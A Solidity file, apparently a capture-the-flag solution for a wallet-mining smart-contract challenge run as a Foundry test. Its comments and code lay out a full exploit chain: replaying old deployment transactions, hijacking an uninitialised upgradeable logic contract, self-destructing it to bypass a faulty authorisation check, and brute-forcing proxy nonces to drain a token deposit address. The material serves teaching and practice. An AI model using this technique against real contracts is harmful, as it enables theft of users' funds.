// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { IWalletDeployer } from "./Interfaces/IWalletDeployer.i.sol";
import { IAuthorizerUpgradeable } from "./Interfaces/IAuthorizerUpgradeable.i.sol";
import { IGnosisSafeProxyFactory } from "./Interfaces/IGnosisSafeProxyFactory.i.sol";
import { IGnosisSafe } from "./Interfaces/IGnosisSafe.i.sol";
import { ICreateAddressNonce } from "./Interfaces/ICreateAddressNonce.i.sol";
import { ITxReplayer } from "./Interfaces/ITxReplayer.i.sol";
import { IGetStorageAt } from "./Interfaces/IGetStorageAt.i.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC1967Utils } from
    "openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Utils.sol";

contract GoldStrike {
    using ERC1967Utils for IAuthorizerUpgradeable;

    address private player;
    IERC20 private token;
    IAuthorizerUpgradeable private authorizer;
    IWalletDeployer private walletDeployer;
    ICreateAddressNonce private nonceHelper;
    ITxReplayer private txReplayer;
    IGetStorageAt private storageHelper;

    address private constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;

    constructor(
        address _token,
        address _authorizer,
        address _walletDelpoyer,
        address _nonceHelper,
        address _replayer,
        address _storage,
        address _player
    ) payable {
        player = _player;
        token = IERC20(_token);
        authorizer = IAuthorizerUpgradeable(_authorizer);
        walletDeployer = IWalletDeployer(_walletDelpoyer);
        nonceHelper = ICreateAddressNonce(_nonceHelper);
        txReplayer = ITxReplayer(_replayer);
        storageHelper = IGetStorageAt(_storage);
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // As usual, any provided player funds have been sent to this contract
        // you to use, and you must send any ether and tokens back to the player
        // by the end of this function. Also, you may or may not want to create
        // additional functions or contracts. As always, you are free to do
        // whatever you want. This contract is just a starting point to help
        // you out.

        // I have provided several utility contracts for you to use, in order
        // to make-up for not having access to ethers.js tooling that was
        // available in the original challenge. I encourage you to take a look
        // at the ./Interfaces directory and see the functions that are available
        // in these helper contracts I have provided.

        // (One of those utilies is the transaction replayer, which uses the "cast"
        // program to get the original transaction data from your default RPC
        // endpoint, which is why --ffi is required for testing this challenge.)

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // This challenge relies on the fact that prior to EIP-155 being introduced
        // (and even after, if applications didn't update how they signed
        // transactions), transactions could be *replayed* on another chain.
        // For example, if I make a transaction on Ethereum saying "send 1 ether
        // to Bob's account", the way the network knows it came from me is the
        // digital signature. That signature is valid for that message, no matter
        // what chain the message is broadcast onto. So if Bob wanted even more
        // money, he could simply re-send that transaction on another evm-compatible
        // chain and the network would view it as valid and give him 1 "ether"
        // from my wallet on that chain, assuming I had the funds available there.

        // Since the Spurious Dragon fork, Ethereum transaction signatures have
        // been able to include the chain ID as part of the data that is signed,
        // so this is no longer possible. But for this challenge, it is still
        // possible! That is what is being alluded to by the challenge saying
        // "Not sure how it's supposed to work though - those contracts haven't
        // been deployed to this chain yet."

        // So what we need to do is find out how the Gnosis Safe and associated
        // contracts were deployed, so we can re-create the process on our
        // forked chain that is used for the challenge test. By doing that,
        // combined with some other hacks to take control of the Safe, we can
        // get at the Deployer's tokens, as well as the 20M tokens available
        // to the unused address.

        // First, by looking at the provided address, we can find out which address
        // deployed the contracts originally, and find the actual transactions
        // that deployed them. Then we can use the provided tx replayer contract
        // to replay those transactions on our test fork. After that, we use
        // some guesswork to determine what type of contract each deployed
        // contract is, and use our interface wrapper to interact with it.

        // After that, we use the fact that contract addresses are deterministic
        // based on the creating contract and a nonce, which allows us to check
        // if we can find a nonce that will create a contract with a given address.

        // There's a slight hiccup, which is that the can() function called by
        // the Wallet Deployer, calls the AuthorizerUpgradeable contract's can()
        // function, which blocks the Wallet Deployer from sending us the
        // tokens. Luckily, it wasn't init'd itself, only the proxy was init'd,
        // so we can init it, and then upgrade it to be a different contract.
        // Because the way the "optimized" code works, the optimized can() check
        // passes if the check passes _or if the contract doesn't exist_. This
        // is because the static call doesn't fail if the called contract doesn't
        // exist, only if the call reverts. So the staticcall will pass without
        // complaint. Because the contract doesn't exist, the return data size
        // will be zero, causing the result of not(iszero(returndatasize())) to
        // be zero:
        //    returndatasize() == 0
        //    iszero(0) == 1
        //    not(1) == 0
        // This means the if statement:
        //    and(not(iszero(returndatasize())), iszero(mload(p)))
        // will fail because the and() stops after the first condition is 0.
        // Therefore, we do not execute the return from the if statement, and
        // fall down to the last line of the "optimized" can() function, which
        // is return true.

        // In order to make the contract disappear, we need it to call selfdestruct,
        // which prior to the cancun fork, caused contracts to be deleted. (Now,
        // after the cancun fork, they are no longer deleted and this challenge
        // would be impossible.) The way we can call selfdestruct is via the
        // upgradeToAndCall() function, which is the UUPS method of changing
        // implementation/logic contracts for proxies. As a part of that function,
        // it makes a delegatecall to the new contract, for the purposes of
        // setup/initialization. But we can use it to call a custom function
        // that has a selfdestruct in it. And because delegatecall uses the
        // caller's context, the selfdestruct will destroy the caller, not the
        // new contract that actually has the selfdestruct code.

        // Now that we know how to get past the hiccup, let's get to it!

        //
        // Replay transactions to create safe, factory proxy, and factory logic implementation
        // These replay, in order, the first outgoing transactions from address
        // 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A
        // a.k.a. nonces 0, 1, and 2

        txReplayer.ReplayTransactionFromID(0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3);
        // |----> creates address 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F (the safe mastercopy)
        require(
            nonceHelper.computeAddress(0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A, 0)
                == 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
        );

        txReplayer.ReplayTransactionFromID(0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4);
        // not a contract creation, but we want to replay it anyway, so that
        // whatever setup for the next tx that needs to be done is done. (Mainly
        // we want to ensure the nonce is correct before making the next tx.)

        txReplayer.ReplayTransactionFromID(0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261);
        // |----> creates address 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B (the factory implementation)
        require(
            nonceHelper.computeAddress(0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A, 2)
                == 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B
        );

        IGnosisSafe masterCopy = IGnosisSafe(payable(0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F));

        // Gotten from looking at the history of 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A
        // and seeing that its second outgoing transaction was to this address
        // and calling setImplementation()
        IGnosisSafeProxyFactory proxyFactory = IGnosisSafeProxyFactory(0x34F5c67D50d7539B69B743F45B7e24ebBE7202cA);

        IGnosisSafeProxyFactory factoryLogic = IGnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);

        // Next we selfdestruct the authorizer logic contract, so that the call
        // to can() calls a non-existent function, which because the walletDeployer
        // "optimized" can() function doesn't work correctly, allows the call to
        // succeed when we try to create new proxies with the drop() function.

        // --------
        // (Note: Prior to the Cancun upgrade, selfdestruct deleted a contract
        // from the blockchain, so that it was unusable and a new contract could
        // later be deployed to that address. After the Cancun upgrade, selfdestruct
        // only sends the contract's ether to a specified address, but the contract
        // remains intact and usable. This is one of the reasons the config file
        // locks the EVM version to Shanghai.)
        // --------

        // We are able to selfdestruct it because the proxy init'd it as a
        // delegate call, but the logic contract was never init'd, thus allowing
        // us to init it. And even though we don't have access to the storage
        // of the proxy, we can still mess with it, for example by self-destructing
        // it and thus breaking the proxy (and in this case, the can() function,
        // which doesn't revert on error, a costly mistake on the optimizer's
        // part!)

        IAuthorizerUpgradeable logicContract = IAuthorizerUpgradeable(
            address(
                uint160(
                    uint256(
                        storageHelper.GetStorageAtSlot(
                            address(authorizer),
                            bytes32(uint256(bytes32(keccak256("eip1967.proxy.implementation"))) - 1)
                        )
                    )
                )
            )
        );

        // Take control of logic contract by init'ing it, which sets us as the
        // owner
        logicContract.init(new address[](0), new address[](0));

        // As owner, we can now set a new contract that has a selfdestruct()
        // and the upgradeToAndCall() function will delegatecall that selfdestruct()
        // Because of the way the "optimized" can() function works, this will
        // cause us to pass the can() check in the drop() function.
        logicContract.upgradeToAndCall(address(this), abi.encodeWithSignature("TheBartThe()"));

        // Now we can perform the rest of attack, a.k.a. stealing the money!

        // The factory is what actually deploys the new proxies, so we will churn
        // through some nonces using the factory as the deploying address and
        // see if any of them match the DEPOSIT_ADDRESS.

        int128 nonce = nonceHelper.findAddressNonce(address(factoryLogic), DEPOSIT_ADDRESS, 0, 200);
        require(nonce != -1, "Did not find a matching nonce :-(");
        // Should be 43, but we don't need to explicitly use that number in our
        // code.

        //
        // We did find the nonce, so now we'll have the safe create a bunch of
        // dummy proxies until it's time to create the DEPOSIT_ADDRESS with
        // all the valuable DVT tokens.

        // The factory already created the one proxy, so for our for-loop math
        // to work out, we subract 1 from the nonce, which represents how many
        // more addresses we must churn through to locate the DEPOSIT_ADDRESS.
        nonce = nonce - 1;

        // The drop() function calls factory.createProxy(), which creates a new
        // proxy that points to the masterCopy (GnosisSafe) contract for its
        // logic. So the function we want to call is the GnosisSafe setup()
        // function, in order to setup the new (proxied) GnosisSafe with
        // our address as the owner/admin, so that we can receive the reward
        // tokens and transfer out any tokens already in the address.
        // (Several of the parameters we will never use, so we set them blank/zero.)
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        for (int128 i = 0; i <= nonce; ++i) {
            uint256 bal = i == nonce ? 2e25 : 0; // only the DEPOSIT_ADDRESS starts with a balance

            bytes memory gnosisSafeCallData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(0),
                "",
                address(0),
                address(token),
                bal,
                address(this)
            );

            walletDeployer.drop(gnosisSafeCallData);
        }

        // Lastly, send the loot to the player
        token.transfer(player, token.balanceOf(address(this)));
        player.call{ value: address(this).balance }("");

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=7PS-wuIsZ4A
    }

    function TheBartThe() public {
        selfdestruct(payable(address(0)));
    }

    // Pretend to be a proxy logic implementation
    function proxiableUUID() public pure returns (bytes32) {
        return bytes32(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
